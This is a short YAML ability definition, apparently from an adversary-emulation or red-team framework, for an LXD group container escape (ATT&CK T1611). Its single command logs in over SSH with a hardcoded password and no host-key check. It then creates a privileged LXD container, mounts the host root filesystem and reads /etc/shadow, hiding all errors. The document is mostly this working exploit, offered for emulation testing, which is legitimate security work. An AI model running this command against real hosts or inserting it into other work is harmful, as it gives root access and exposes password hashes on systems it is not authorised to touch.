- id: priv03-lxd-escape
  name: LXD Group Container Escape
  description: Exploit LXD group membership to mount host filesystem as root
  tactic: privilege-escalation
  technique:
    attack_id: T1611
    name: Escape to Host
  platforms:
    linux:
      sh:
        command: |
          sshpass -p 'password' ssh -o StrictHostKeyChecking=no lxduser@10.0.20.200 "lxc init ubuntu:20.04 privesc -c security.privileged=true 2>/dev/null; lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true 2>/dev/null; lxc start privesc 2>/dev/null; lxc exec privesc -- cat /mnt/root/etc/shadow 2>/dev/null" 2>/dev/null || echo 'LXD escape attempted'

  singleton: false
  repeatable: false
